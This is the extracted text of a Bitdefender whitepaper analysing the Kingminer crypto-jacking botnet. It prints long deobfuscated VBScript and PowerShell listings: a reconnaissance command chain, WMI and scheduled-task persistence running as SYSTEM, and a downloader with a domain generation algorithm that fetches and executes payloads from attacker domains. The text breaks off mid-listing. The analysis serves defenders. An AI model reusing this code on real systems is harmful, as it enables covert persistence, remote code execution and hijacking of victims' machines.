{
    "id": "0e4a285d-ea71-45f9-b85c-51752b32e694",
    "created_at": "2022-10-25T16:48:17.096852Z",
    "updated_at": "2025-03-27T02:09:29.830728Z",
    "deleted_at": null,
    "sha1_hash": "7721e884008ccb409c7e668093ad183ef479c168",
    "title": "Macintosh HD:Users:Shared:dd:4work:Bitdefender-PR-Whitepaper-KingMiner-creat4610-en_EN:Bitdefender-PR-Whitepaper-KingMiner-creat4610-en_EN.indd",
    "authors": "",
    "file_creation_date": "2020-07-07T10:30:48Z",
    "file_modification_date": "2020-07-07T10:30:51Z",
    "file_size": 5606949,
    "plain_text": "#### Security\n# Kingminer –a Crypto-Jacking Botnet Under the Scope\n\nwww.bitdefender.com\n\n\n-----\n\n## Contents\n\nIntroduction......................................................................................................................................................3\nTechnical Analysis of a Kingminer Infection..................................................................................................4\n\nInitial Access.................................................................................................................................................................4\nExecution flow...............................................................................................................................................................4\nToo much ado about a crypto-miner?........................................................................................................................19\nImpact..........................................................................................................................................................................20\nCampaign distribution.................................................................................................................................. 20\nConclusion..................................................................................................................................................... 21\nBibliography................................................................................................................................................... 21\nMITRE techniques breakdown..................................................................................................................... 21\nAppendix 1. Indicators of Compromise....................................................................................................... 22\n\n\n**Author:**\n\n\n-----\n\nKingminer –a Crypto-Jacking Botnet Under the Scope\n\n\n-----\n\nKingminer –a Crypto-Jacking Botnet Under the Scope\n\n## Technical Analysis of a Kingminer Infection\n\n### Initial Access\n\nThe infection usually starts from an SQL server process (sqlservr.exe) or a Print Spooler Service process (spoolsv.exe).\nThe versions of SQL servers on victim machines are up to date and have no known 0-day vulnerabilities. Attackers\nexploit configuration flaws such as weak passwords and default credentials to obtain access to the server and schedule\nmalicious commands for execution. Executions starting from spoolsv.exe are caused by attackers exploiting machines\nvulnerable to EternalBlue (CVE-2017-0144 [4]).\n\nWhen attackers gain access to either an sqlservr.exe process or a spoolsv.exe process, they first want to ensure that the\nattacked environment meets predefined criteria. To achieve this, the following command is run:\n\ncmd /c ver |findstr “5.0 5.1 5.2 6.0 6.1” && wmic qfe GET hotfixid |findstr /i «kb4499175\nkb4500331» `||wmic RDTOGGLE WHERE` `ServerName=›%COMPUTERNAME%›` call SetAllowTSConnections 0\n\nThis command pipes together three helpful functions to the attacker:\n\n- _ver | findstr “5.0 5.1 5.2 6.0 6.1” - searches for specific Windows versions_\n\n- _wmic qfe GET hotfixid | findstr /i “kb4499175 kb4500331” - searches with the help of WMI (Windows Management_\nInstrumentation) if specific Windows Updates are installed on the system. WMI is often used by advanced malware\nfor discovery, command execution and defense evasion.\n\n  - **kb4499175 fixes Microarchitectural Data Sampling vulnerabilities**\n\n  - **kb4500331 fixes CVE-2019-0708 [5], a remote code execution vulnerability in Remote Desktop Protocol**\n\n- _wmic RDTOGGLE WHERE ServerName=’%COMPUTERNAME%’ call SetAllowTSConnections 0 - disables Remote Desktop_\nconnections to the target machine, with the help of WMI\n\nWhen everything is ready, the attackers begin downloading and executing their tools. Download and execution of the bot\nis completely file-less. First, Powershell downloads and executes Mimikatz, then Mshta runs a custom-made polymorphic\nscript obtained from the attacker’s server. Both Mimikatz and the first stage script are downloaded and executed inmemory, without ever being saved to a file on the disk. We continue to analyze the first stage scripts capabilities in the\nfollowing.\n\n### Execution flow\n\nExecution starts from either a sqlservr.exe process or a spoolsv.exe process. After that, it branches quickly into multiple\ndifferent scripts. Various threads of execution can be seen in the following graph:\n\n\n-----\n\nKingminer –a Crypto-Jacking Botnet Under the Scope\n\nNow, let’s take each step apart and see the various techniques employed.\n\n##### First Stage VBScript\nThe first stage loader is called r1.txt and its goal is to ensure persistence on the system and to deliver the following stages.\nThe variables in scripts are random, with strings encoded with hexadecimal values of each character. The function at the\nend of the file is responsible for transforming these arrays back to interpretable form. With the essential strings decoded,\nthe script looks like below.\n\n##### Listing of r1.txt\nConst zdmdcvgrnp = 2\nConst anpotcjuad = 1\nConst xumfurbwlu = 0\nOn Error Resume Next\ncqenynybltj =  “on error resume next:Dim a1, b, c,u:Set a1 = CreateObject(“WScript.Shell”):Set b = a1.Exec(“nslookup news.g23thr.com”):Do While Not\nb.” & “StdOut.AtEndOfStream:c = b.StdOut.ReadAll():Loop:Dim d,e, f:u = (hex((year(now())-2000)&Month(now())&(day(now())\\32)&(year(now())-2000)))&”fdae.com”:Set d =\nNew RegExp:d.Pattern = “(\\d{1,3})\\.(\\d{1,3})\\.(\\d{1,3})\\.(120)”:d.IgnoreCase = False:d.\nGlobal = True:Set e = d.Execute(c):If e.Count > 0 Then:u = chr(e.Item(0).submatches.\nItem(0))&chr(e.Item(0).submatches.Item(1))&chr(e.Item(0).submatches.Item(2))&chr(e.\nItem(0).submatches.Item(3))&”fghh.com”:End If:Function a(ByVal s):For i = 1 To Len(s)\nStep 2:c = Mid(s, i, 2):If IsNumeric(Mid(s, i, 1)) Then:a = a & Chr(“&H” & c):Else:a =\na & Chr(“&H” & c & Mid(s, i + 2, 2)):i = i + 2:End If:Next:End Function:Set h = CreateObject(“MSXML2.ServerXMLHTTP”):h.SetTimeOuts 10000,10000,10000,60000:h.open “GET”,\n“http://”&minute(now())&second(now())&”.”&u&”/tan.txt”, false:h.send():execute(a(h.reT t))”\n\n\n-----\n\nKingminer –a Crypto-Jacking Botnet Under the Scope\n\npveioxdeaxavbqet =  “622C20632C753A536574206131203D204372656174654F6\n26A6563742822575363726970742E5368656C6C22293A5365742062203D2061312E45\n78656328226E736C6F6F6B7570206E6577732E6732337468722E636F6D22293A446F205768696C65204E6F7420622E5374644F75742E4174456E644F6653747265616D3A63203D20622E\n5374644F75742E52656164416C6C28293A4C6F6F703A44696D20642C652C20663A75203D20286865\n78282879656172286E6F772829292D3230303029264D6F6E7468286E6F772829292628646179286E\n6F772829295C333229262879656172286E6F772829292D323030302929292622666461652E636F6D223A5365742064203D204E6577205265674578703A642E5061747465726E203D2022285C647B312C337D295C2E285C647B312C337D295C2E285C647B312C337D295C2E2831323029223A642E49676E6F726543617365203D2046616C73653A642E476C6F62616C203D2\n0547275653A5365742065203D20642E457865637574652863293A496620652E436F756E74203E2030205468656E3A75203D2063687228652E4974656D2830292E7375626D6174636865732E4974656D283029292663687228652E4974656D2830292E7375626D6174636865732E4\n974656D28312929266” & “3687228652E4974656D2830292E7375626D6174636865732E4974656D283229292663687228652E4974656D2830292E7375626D6174636865732E497465\n6D283329292622666768682E636F6D223A456E642049663A46756E6374696F6E206128427956616C2073293A466F722069203D203120546F204C656E28732920537465702032\n3A63203D204D696428732C20692C2032293A49662049734E756D65726963284D696428732C20692C20312929205468656E3A61203D2061202620436872282226482220262063293A456C\n73653A61203D20612026204368722822264822202620632026204D696428732C2069202B20322C203229293A69203D2069202B20323A456E642049663A4E6578743A456E642046756E6374696F6E3A4765744F626A65637428227363726970743A222622687474703A2F2F22266D696E757465286E6F77282929267365636F6E64286E6F7728292926222E22267526222F74616E312E7478742229”\nRandomize\nrqlgjgnuabnchgegaj =  Int(Rnd*12)+20\nqazclrgzz =  Int(Rnd*12)+20\niwzkqqbtjy =  Int(Rnd*12)+20\nkpzthagtn =  Int(Rnd*12)+20\ngfxrhowfxcszqmmww =  Int(Rnd*12)+20\nqbzabgpb =  pbcwizsbdtkz(cqenynybltj)\nvpqrknzaed =  hyczpegyfnc(Replace(qbzabgpb,pbcwizsbdtkz(“ta”) & pbcwizsbdtkz(“n.txt”),pbcwizsbdtkz(“mgxbo”) & pbcwizsbdtkz(“x.txt”)))\nrwmgpgbkfvupweahabp =  hyczpegyfnc(Replace(qbzabgpb,pbcwizsbdtkz(“tan.tx”) & pbcwizsbdtkz(“74”),pbcwizsbdtkz(“pow.tx”) & pbcwizsbdtkz(“t”)))\nynxuimhwwcfhcshwh =  hyczpegyfnc(Replace(pbcwizsbdtkz(pveioxdeaxavbqet),pbcwizsbdtkz(“74”) & pbcwizsbdtkz(“an1.txt”),pbcwizsbdtkz(“r1”) & pbcwizsbdtkz(“1.txt”)))\niiaslrnx =  “Function zaqxswcdevfrbgtweeertt(ByVal sgghjjjjjjjyyu):For i = 1 To Len(sgghjjjjjjjyyu) Step 2:c = Mid(sgghjjjjjjjyyu, i, 2):zaqxswcdevfrbgtweeertt = zaqxs”\n& “wcdevfrbgtweeertt & Chr(“&H” & c Xor pass5 Xor pass4 Xor pass3 Xor pass2 Xor\npass1):Next:End Function:execute zaqxswcdevfrbgtweeertt(“smm”)”\nvtcdewpen =  “-c “$sc = New-Object -ComObject ScriptControl;$sc.Language = ‘VBS” &\n“cript’;$p=’zaq’;$p = for($i=0; $i -lt $p.length; $i+=2){[char](([byte][char][int]::Parse($p.substring($i,2),’HexNumber’)) -bxor pass5 -bxor pass4 -bxor pass3 -bxor\npass2 -bxor pass1)};$sc.AddCode((-join $p) -join ‘ ‘)””\niiaslrnx =  pbcwizsbdtkz(iiaslrnx)\nvtcdewpen =  pbcwizsbdtkz(vtcdewpen)\ntpejhiqrflrwc =  Replace(vtcdewpen,pbcwizsbdtkz(“pass”) & pbcwizsbdtkz(“1”),ervseefg(rqlgjgnuabnchgegaj))\ntpejhiqrflrwc =  Replace(tpejhiqrflrwc,pbcwizsbdtkz(“pass”) & pbcwizsbdtkz(“32”),ervseefg(qazclrgzz))\ntpejhiqrflrwc =  Replace(tpejhiqrflrwc,pbcwizsbdtkz(“p”) & pbcwizsbdtkz(“ass3”),ervseefg(iwzkqqbtjy))\ntpejhiqrflrwc =  Replace(tpejhiqrflrwc,pbcwizsbdtkz(“p”) & pbcwizsbdtkz(“ass4”),ervseefg(kpzthagtn))\ntpejhiqrflrwc =  Replace(tpejhiqrflrwc,pbcwizsbdtkz(“pa”) & pbcwizsbdtkz(“ss5”),ervseefg(gfxrhowfxcszqmmww))\ndlwhwoqntreex =  Replace(tpejhiqrflrwc,pbcwizsbdtkz(“zaq”),ervseefg(rwmgpgbkfvupweahabp))\nhqumuecevijgsdskytv =  Replace(tpejhiqrflrwc,pbcwizsbdtkz(“7a6171”),ervseefg(ynx\n\n-----\n\nKingminer –a Crypto-Jacking Botnet Under the Scope\n\nhqumuecevijgsdskytv =  Replace(hqumuecevijgsdskytv,pbcwizsbdtkz(“24”) & pbcwizsbdtkz(“73632e416464”),pbcwizsbdtkz(“53746172742d536c656570202d5365636f6e6473203132303b24”)\n& pbcwizsbdtkz(“73632e416464”))\niiaslrnx =  Replace(iiaslrnx,pbcwizsbdtkz(“smm”),ervseefg(vpqrknzaed))\niiaslrnx =  Replace(iiaslrnx,pbcwizsbdtkz(“pas”) & pbcwizsbdtkz(“s1”),ervseefg(rqlgjgnuabnchgegaj))\niiaslrnx =  Replace(iiaslrnx,pbcwizsbdtkz(“pa”) & pbcwizsbdtkz(“ss2”),ervseefg(qazclrgzz))\niiaslrnx =  Replace(iiaslrnx,pbcwizsbdtkz(“p”) & pbcwizsbdtkz(“ass3”),ervseefg(iwzkqqbtjy))\niiaslrnx =  Replace(iiaslrnx,pbcwizsbdtkz(“pas”) & pbcwizsbdtkz(“s4”),ervseefg(kpzthagtn))\niiaslrnx =  Replace(iiaslrnx,pbcwizsbdtkz(“pass”) & pbcwizsbdtkz(“5”),ervseefg(gfxrhowfxcszqmmww))\neqhlmdqop =  iiaslrnx\ngohcilrocwfesgfjahhs =  pbcwizsbdtkz(“winmgmts:\\\\.\\root”) & pbcwizsbdtkz(“\\cimv2:”)\naeqmshupcgm =  pbcwizsbdtkz(“winmgmts:\\\\.\\root\\sub”) & pbcwizsbdtkz(“scription:”)\noduamvztnvtr =  pbcwizsbdtkz(“Win”) & pbcwizsbdtkz(“dowsSystemManager”)\nvqjgetsuavqg =  960000\nSet gqohaaaoltgi =  GetObject(ervseefg(aeqmshupcgm)&pbcwizsbdtkz(“ActiveScriptEventCo”) & pbcwizsbdtkz(“nsumer”)).spawninstance_\ngqohaaaoltgi.name =  ervseefg(oduamvztnvtr)&pbcwizsbdtkz(“_co”) & pbcwizsbdtkz(“nsumer”)\ngqohaaaoltgi.scriptingengine =  pbcwizsbdtkz(“vbscri”) & pbcwizsbdtkz(“pt”)\ngqohaaaoltgi.scripttext =  eqhlmdqop\nSet hxihbrxxc =  gqohaaaoltgi.put_\nSet wdyzxwnkztbwzjprgq =  GetObject(ervseefg(aeqmshupcgm)&pbcwizsbdtkz(“__IntervalTimerInstruc”) & pbcwizsbdtkz(“tion”)).spawninstance_\nwdyzxwnkztbwzjprgq.timerid =  ervseefg(oduamvztnvtr)&pbcwizsbdtkz(“_WM”) & pbcwizsbdtkz(“ITimer”)\nwdyzxwnkztbwzjprgq.intervalbetweenevents =  vqjgetsuavqg\nwdyzxwnkztbwzjprgq.skipifpassed =  False\nwdyzxwnkztbwzjprgq.put_\nSet sadoryqozaymga =  GetObject(ervseefg(aeqmshupcgm)&pbcwizsbdtkz(“__Event”) & pbcwizsbdtkz(“Filter”)).spawninstance_\nsadoryqozaymga.name =  ervseefg(oduamvztnvtr)&pbcwizsbdtkz(“_filte”) & pbcwizsbdtkz(“r”)\nsadoryqozaymga.query =  “select * from __timerevent where timerid =  “””&ervseefg(oduamvztnvtr)&”_WMITimer”””\nsadoryqozaymga.querylanguage =  pbcwizsbdtkz(“77716c”)\nSet rrlnmtmyjdazqq =  sadoryqozaymga.put_\nSet zxfqfilhpi =  GetObject(ervseefg(aeqmshupcgm)&pbcwizsbdtkz(“__FilterToCon”) & pbcwizsbdtkz(“sumerBinding”)).spawninstance_\nzxfqfilhpi.consumer =  hxihbrxxc.path\nzxfqfilhpi.Filter =  rrlnmtmyjdazqq.path\nzxfqfilhpi.put_\nFunction nocjinucpt()\nstrComputer = pbcwizsbdtkz(“2e”)\nSet podozwtglncyub = GetObject(pbcwizsbdtkz(“win”) & pbcwizsbdtkz(“mgmts:\\\\”) & strComputer & pbcwizsbdtkz(“\\ro”) & pbcwizsbdtkz(“ot\\cimv2”))\nSet yeqboijbjth = podozwtglncyub.ExecQuery(pbcwizsbdtkz(“Select * f”) & pbcwizsbdtkz(“rom Win32_ComputerSystem”),,48)\nFor Each objItem In yeqboijbjth\nIf InStr(objItem.SystemType, pbcwizsbdtkz(“3836”)) <> 0 Then\nnocjinucpt = pbcwizsbdtkz(“783836”)\nElseIf InStr(objItem.SystemType, pbcwizsbdtkz(“3634”)) <> 0 Then\nnocjinucpt = pbcwizsbdtkz(“783634”)\nElse\nnocjinucpt = pbcwizsbdtkz(“783836”)\n\n\n-----\n\nKingminer –a Crypto-Jacking Botnet Under the Scope\n\nEnd Function\nFunction polzjgzax()\nIf nocjinucpt() = pbcwizsbdtkz(“x64”) Then\nsMob = pbcwizsbdtkz(“%SystemRoot%\\syswow64\\WindowsPowerShell\\v1”) & pbcwizsbdtkz(“.0\\\npowershell.exe”)\nElse\nsMob = pbcwizsbdtkz(“powershe”) & pbcwizsbdtkz(“ll.exe”)\nEnd If\nConst gizdzdoicuacibijmar = 1\nConst qkrlxjqixvsvijlrvt = 0\nSet eawzmvpenfl = CreateObject(pbcwizsbdtkz(“Schedule.S”) & pbcwizsbdtkz(“ervice”))\nCall eawzmvpenfl.Connect\nDim llolegkf\nSet llolegkf = eawzmvpenfl.GetFolder(pbcwizsbdtkz(“\\”))\nDim qfkrkntdmq\nSet qfkrkntdmq = eawzmvpenfl.NewTask(O)\nDim wcxemjygjmuuj\nSet wcxemjygjmuuj = qfkrkntdmq.principal\nwcxemjygjmuuj.UserId = pbcwizsbdtkz(“NT AUTH”) & pbcwizsbdtkz(“ORITY\\SYSTEM”)\nwcxemjygjmuuj.RunLevel = 1\nDim jdxzbahzl\nSet jdxzbahzl = qfkrkntdmq.settings\njdxzbahzl.Enabled = True\njdxzbahzl.StartWhenAvailable = True\njdxzbahzl.Hidden = False\nDim jnnecumyryfxzri\nSet jnnecumyryfxzri = qfkrkntdmq.triggers\nDim ehybtnwgp\nSet ehybtnwgp = jnnecumyryfxzri.Create(gizdzdoicuacibijmar)\nDim startTime, endTime\n```\nDim Time\n\n```\nTime = DateAdd(pbcwizsbdtkz(“s”), 60, Now)\nstartTime = trltuhljoinkozc(Time)\nehybtnwgp.StartBoundary = startTime\nehybtnwgp.Enabled = True\nDim tvmgqoxkjhiqaqpfzlvx\nSet tvmgqoxkjhiqaqpfzlvx = ehybtnwgp.Repetition\ntvmgqoxkjhiqaqpfzlvx.Interval =  pbcwizsbdtkz(“PT”) & pbcwizsbdtkz(“28”) & pbcwizsbdtkz(“M”)\nDim rmmjjktopxx\nSet rmmjjktopxx = qfkrkntdmq.Actions.Create(qkrlxjqixvsvijlrvt)\nrmmjjktopxx.Path = sMob\nrmmjjktopxx.Arguments = dlwhwoqntreex\nCall llolegkf.RegisterTaskDefinition(pbcwizsbdtkz(“Window”) & pbcwizsbdtkz(“sUpdateMonitor”), qfkrkntdmq, 6,,, 3)\npolzjgzax = 5\nEnd Function\nFunction trltuhljoinkozc(t)\nDim cSecond, cMinute, CHour, cDay, cMonth, cYear\nDim tTime, tDate\ncSecond = pbcwizsbdtkz(“0”) & Second(t)\ncMinute = pbcwizsbdtkz(“30”) & Minute(t)\ncHour = pbcwizsbdtkz(“30”) & Hour(t)\ncDay = pbcwizsbdtkz(“30”) & Day(t)\ncMonth = pbcwizsbdtkz(“30”) & Month(t)\ncYear = Year(t)\ntTime = Right(cHour, zdmdcvgrnp) & pbcwizsbdtkz(“3a”) & Right(cMinute, zdmdcvgrnp) & _\npbcwizsbdtkz(“:”) & Right(cSecond, zdmdcvgrnp)\ntDate = cYear & pbcwizsbdtkz(“2d”) & Right(cMonth, zdmdcvgrnp) & pbcwizsbdtkz(“2d”) &\n\n\n-----\n\nKingminer –a Crypto-Jacking Botnet Under the Scope\n\ntrltuhljoinkozc = tDate & pbcwizsbdtkz(“T”) & tTime\nEnd Function\nztwhyaqygfbhcx =  polzjgzax()\nFunction oehralhsvmhmil()\nIf nocjinucpt() = pbcwizsbdtkz(“x64”) Then\nsMob = pbcwizsbdtkz(“%SystemRoot%\\syswo”) & pbcwizsbdtkz(“w64\\WindowsPowerShell\\v1.0\\\npowershell.exe”)\nElse\nsMob = pbcwizsbdtkz(“706f7765727368656c6c2e”) & pbcwizsbdtkz(“657865”)\nEnd If\nConst xiuoukfbjwlvjknr = 8\nConst qkrlxjqixvsvijlrvt = 0\nSet eawzmvpenfl = CreateObject(pbcwizsbdtkz(“Schedul”) & pbcwizsbdtkz(“e.Service”))\nCall eawzmvpenfl.Connect\nDim llolegkf\nSet llolegkf = eawzmvpenfl.GetFolder(pbcwizsbdtkz(“5c”))\nDim qfkrkntdmq\nSet qfkrkntdmq = eawzmvpenfl.NewTask(O)\nDim wcxemjygjmuuj\nSet wcxemjygjmuuj = qfkrkntdmq.principal\nwcxemjygjmuuj.UserId = pbcwizsbdtkz(“NT AUTHORIT”) & pbcwizsbdtkz(“Y\\SYSTEM”)\nwcxemjygjmuuj.RunLevel = 1\nDim jdxzbahzl\nSet jdxzbahzl = qfkrkntdmq.settings\njdxzbahzl.Enabled = True\njdxzbahzl.StartWhenAvailable = True\njdxzbahzl.Hidden = False\nDim jnnecumyryfxzri\nSet jnnecumyryfxzri = qfkrkntdmq.triggers\nDim ehybtnwgp\nSet ehybtnwgp = jnnecumyryfxzri.Create(xiuoukfbjwlvjknr)\nehybtnwgp.Enabled = True\nDim rmmjjktopxx\nSet rmmjjktopxx = qfkrkntdmq.Actions.Create(qkrlxjqixvsvijlrvt)\nrmmjjktopxx.Path = sMob\nrmmjjktopxx.Arguments = hqumuecevijgsdskytv\nCall llolegkf.RegisterTaskDefinition(pbcwizsbdtkz(“Window”) & pbcwizsbdtkz(“sSystemHelper”), qfkrkntdmq, 6,,, 3)\noehralhsvmhmil = 5\nEnd Function\nccrimlvr =  oehralhsvmhmil()\nFunction hyczpegyfnc(ByVal vpqrknzaed)\nFor i =  1 To Len(vpqrknzaed)\nhyczpegyfnc =  hyczpegyfnc & Hex(Asc(Mid(vpqrknzaed, i, anpotcjuad)) Xor rqlgjgnuabnchgegaj Xor qazclrgzz Xor iwzkqqbtjy Xor kpzthagtn Xor gfxrhowfxcszqmmww)\nNext\nEnd Function\nFunction ervseefg(ByVal vpqrknzaed)\nervseefg =  vpqrknzaed\nEnd Function\nFunction pbcwizsbdtkz(ByVal vpqrknzaed)\nFor i =  1 To Len(vpqrknzaed) Step 2\nc =  Mid(vpqrknzaed, i, zdmdcvgrnp)\npbcwizsbdtkz =  pbcwizsbdtkz & Chr(Chr(38) & Chr(72) & c)\nNext\nEnd Function\n\nThree branches of execution are achieved by this script; WMI-based payload execution and two scheduled tasks, Windows\nSystem Helper and Windows Update Monitor We analyze them individually in the following sections\n\n\n-----\n\nKingminer –a Crypto-Jacking Botnet Under the Scope\n\n##### WMI Event Subscription-based execution\nThe first branch is based on registering an active script consumer to execute periodically. The script calls GetObject\non each of the requested object, providing the namespace winmgmts:\\\\\\\\.\\\\root\\\\subscription: and then calling\nthe _spawninstance method of each class to obtain instances of WMI classes. The script spawns an instance of\nActiveScriptEventConsumer [6] (line 40), sets its name to WindowsSystemManager_consumer, and assigns a VBScript\nto it that resides under the variable eqhlmdqop. Then, it spawns an instance of __IntervalTimerInstruction [7] (line 45),\nsets its timer id to WindowsSystemManager_WMITimer, and sets its interval to 960000 ms. The next spawned object is\n__EventFilter [8] (line 50), which executes the query\n\nselect * from __timerevent where timerid = “WindowsSystemManager_WMITimer”\n\nto filter only the timer event registered above. Finally, it spawns __FilterToConsumerBinding [9] (line 55) and links the\nevent filter to the consumer. This way, every 16 minutes, when WindowsSystemManager_WMITimer triggers, the script\n_eqhlmdqop is called. The script decrypts the big blob of hexadecimal numbers and executes the result, which is a_\ndownloader script used in more of the subsequent steps.\n\n##### Downloader Script and Domain Generation Algorithm Listing of downloader script\non error resume next:Dim a1, b, c,u:Set a1 = CreateObject(“WScript.Shell”):Set b =\na1.Exec(“nslookup news.g23thr.com”):Do While Not b.StdOut.AtEndOfStream:c = b.StdOut.\nReadAll():Loop:Dim d,e, f:u = (hex((year(now())-2000)&Month(now())&(day(now())\\32)&(year(now())-2000)))&”fdae.com”:Set d = New RegExp:d.Pattern = “(\\d{1,3})\\.(\\d{1,3})\\.\n(\\d{1,3})\\.(120)”:d.IgnoreCase = False:d.Global = True:Set e = d.Execute(c):If e.Count\n\n- 0 Then:u = chr(e.Item(0).submatches.Item(0))&chr(e.Item(0).submatches.Item(1))&chr(e.\nItem(0).submatches.Item(2))&chr(e.Item(0).submatches.Item(3))&”fghh.com”:End If:Function a(ByVal s):For i = 1 To Len(s) Step 2:c = Mid(s, i, 2):If IsNumeric(Mid(s, i,\n1)) Then:a = a & Chr(“&H” & c):Else:a = a & Chr(“&H” & c & Mid(s, i + 2, 2)):i = i +\n2:End If:Next:End Function:Set h = CreateObject(“MSXML2.ServerXMLHTTP”):h.SetTimeOuts\n10000,10000,10000,60000:h.open “GET”, “http://”&minute(now())&second(now())&”.”&u&”/\nmgxbox.txt”, false:h.send():execute(a(h.responseText))\n\nIt first checks if news.g23thr.com resolves to an IP address to ensure the computer has an internet connection. It then\napplies its Domain Generation Algorithm to obtain the currently valid attacker URL. The string consists of the current\nminute and second concatenated with the hexadecimal value of the number formed by <year + month + ‘0’ + year>\ntogether with fdae.com. So if the date is the 23rd of June 2020, it would form the number 206020, the minute is 18 and\nthe second is 30 then the URL would look like:\n\n**1830.324C4fdae.com/<payload_name>**\n\nFinally, the script downloads msgbox.txt from the server and executes it in-memory. At first glance, this script seems very\nsimilar to the first stage script (r1.txt), using the same variable randomization techniques and string decoding with the\nfunction at the end; however, its goal is different, as shown below.\n\n##### Listing of msgbox.txt\nConst mmrvsowgpi = 2\nConst sjuztpiajd = 1\nConst hktvywfcyu = 0\nDim cpan,banben,weishu,exelu,worklu,mulu,klu,fso,cpllu,mklu,kwenjian,cplwen,ws,url\nOn Error Resume Next\nSet anhywquhuxkmsbrah = CreateObject(tlcyyzdozckfwqjlapy(“wscrip”) & tlcyyzdozckfwqjlapy(“t.shell”))\nSet fso=CreateObject(tlcyyzdozckfwqjlapy(“scripting.filesyste”) & tlcyyzdozckfwqjlapy(“mobject”))\nFunction qiiwksoqz()\nDim res\n\n\n-----\n\nKingminer –a Crypto-Jacking Botnet Under the Scope\n\nstrComputer = tlcyyzdozckfwqjlapy(“.”)\nSet kowozfxtxewabs = GetObject(tlcyyzdozckfwqjlapy(“winmgmts:\\”) & tlcyyzdozckfwqjlapy(“\\”) & strComputer & tlcyyzdozckfwqjlapy(“\\root\\cim”) & tlcyyzdozckfwqjlapy(“v2”))\nSet iskbwbanbinyuqo = kowozfxtxewabs.ExecQuery(tlcyyzdozckfwqjlapy(“Select * from\nWin32_OperatingS”) & tlcyyzdozckfwqjlapy(“ystem”),,48)\nres =tlcyyzdozckfwqjlapy(“infoStar”) & tlcyyzdozckfwqjlapy(“t”)\nFor Each objItem In colItems\nqiiwksoqz = objItem.SystemDrive\nNext\nEnd Function\nFunction hscdqmssmaiehbcguamv()\nstrComputer = tlcyyzdozckfwqjlapy(“.”)\nSet kowozfxtxewabs = GetObject(tlcyyzdozckfwqjlapy(“winm”) & tlcyyzdozckfwqjlapy(“gmts:\\\\”) & strComputer & tlcyyzdozckfwqjlapy(“\\root”) & tlcyyzdozckfwqjlapy(“\\cimv2”))\nSet iskbwbanbinyuqo = kowozfxtxewabs.ExecQuery(tlcyyzdozckfwqjlapy(“Select * from Win”)\n& tlcyyzdozckfwqjlapy(“32_ComputerSystem”),,48)\nFor Each objItem In iskbwbanbinyuqo\nIf InStr(objItem.SystemType, tlcyyzdozckfwqjlapy(“86”)) <> 0 Then\nhscdqmssmaiehbcguamv = tlcyyzdozckfwqjlapy(“x86”)\nElseIf InStr(objItem.SystemType, tlcyyzdozckfwqjlapy(“64”)) <> 0 Then\nhscdqmssmaiehbcguamv = tlcyyzdozckfwqjlapy(“x64”)\nElse\nhscdqmssmaiehbcguamv = tlcyyzdozckfwqjlapy(“x86”)\nEnd If\nNext\nEnd Function\nFunction dqvghtrbjhoprcpp(infile,outfile)\nSet ins=CreateObject(tlcyyzdozckfwqjlapy(“adodb.s”) & tlcyyzdozckfwqjlapy(“tream”))\nWith ins\n.type=1\n.mode=3\n.open\n.loadfromfile(infile)\n.position=ins.size-2\nIf ascb(.read(1))=99 And ascb(.read(1))=100 Then\n.savetofile outfile,2\nEnd If\nEnd With\nSet ins=Nothing\nEnd Function\nFunction eeceudtczqdkwtjncas(infile,outfile,moutfile,xornum1,xornum2,xornum3)\nDim ins,dom,elm,stm,tmp\nSet ins=CreateObject(tlcyyzdozckfwqjlapy(“adodb.st”) & tlcyyzdozckfwqjlapy(“ream”))\nSet dom=CreateObject(tlcyyzdozckfwqjlapy(“microso”) & tlcyyzdozckfwqjlapy(“ft.xmldom”))\nSet elm=dom.createelement(tlcyyzdozckfwqjlapy(“z”))\nelm.datatype=tlcyyzdozckfwqjlapy(“bin”) & tlcyyzdozckfwqjlapy(“.hex”)\nSet stm=CreateObject(tlcyyzdozckfwqjlapy(“adodb”) & tlcyyzdozckfwqjlapy(“.stream”))\nWith stm\n.mode=3\n.type=1\n.open\nEnd With\nWith ins\n.type=1\n.mode=3\n.open\n.Write infile\n.position=0\nFor i=1 To ins.size\n\n\n-----\n\nKingminer –a Crypto-Jacking Botnet Under the Scope\n\nelm.text=tmp\nIf i=ins.size-1 Then\nelm.text=Hex(99)\nEnd If\nIf i=ins.size Then\nelm.text=Hex(100)\nEnd If\nIf i=ins.size-3 Then\nelm.text=Hex(xornum1)\nEnd If\nIf i=ins.size-4 Then\nelm.text=Hex(xornum2)\nEnd If\nIf i=ins.size-5 Then\nelm.text=Hex(xornum3)\nEnd If\nstm.write elm.nodetypedvalue\nNext\nstm.savetofile outfile,2\nstm.savetofile moutfile,2\n.close\nEnd With\nstm.close\nSet ins=Nothing\nSet stm=Nothing\nSet elm=Nothing\nSet dom=Nothing\nEnd Function\nFunction mxwkyhinoizevvq(base164)\nDim zdpluhudorhtylzotpcn, gxwfqtjmkfzwggoxhzaw\nSet zdpluhudorhtylzotpcn = CreateObject(tlcyyzdozckfwqjlapy(“Mic”) & tlcyyzdozckfwqjlapy(“rosoft.XMLDOM”))\nSet gxwfqtjmkfzwggoxhzaw = zdpluhudorhtylzotpcn.createElement(tlcyyzdozckfwqjlapy(“tmp”))\ngxwfqtjmkfzwggoxhzaw.DataType = tlcyyzdozckfwqjlapy(“bin.base6”) & tlcyyzdozckfwqjlapy(“4”)\ngxwfqtjmkfzwggoxhzaw.Text = base164\nmxwkyhinoizevvq = gxwfqtjmkfzwggoxhzaw.NodeTypedValue\nEnd Function\nFunction wpdpbhrdgigjmb(GetUrl)\nSet anfendjlea = CreateObject(tlcyyzdozckfwqjlapy(“MSXML2.ServerXMLHT”) & tlcyyzdozckfwqjlapy(“TP”))\nanfendjlea.SetTimeOuts 10000,10000,10000,300000\nanfendjlea.SetOption 2,13056\nanfendjlea.open tlcyyzdozckfwqjlapy(“GET”),GetUrl,False\nanfendjlea.setRequestHeader tlcyyzdozckfwqjlapy(“If-Modi”) & tlcyyzdozckfwqjlapy(“fied-Since”),tlcyyzdozckfwqjlapy(“0”)\nanfendjlea.send()\nIf anfendjlea.ReadyState = 4 And anfendjlea.Status = 200 Then\nwpdpbhrdgigjmb = anfendjlea.responseBody\nEnd If\nSet anfendjlea = Nothing\nIf Err.number <> 0 Then Err.Clear\nEnd Function\nFunction xfwztzstrianbdobpjyg(GetUrl)\nSet anfendjlea = CreateObject(tlcyyzdozckfwqjlapy(“MSXML2.ServerXML”) & tlcyyzdozckfwqjlapy(“HTTP”))\nanfendjlea.SetTimeOuts 10000,10000,10000,30000\nanfendjlea.SetOption 2,13056\n\n\n-----\n\nKingminer –a Crypto-Jacking Botnet Under the Scope\n\nanfendjlea.setRequestHeader tlcyyzdozckfwqjlapy(“If-Modifi”) 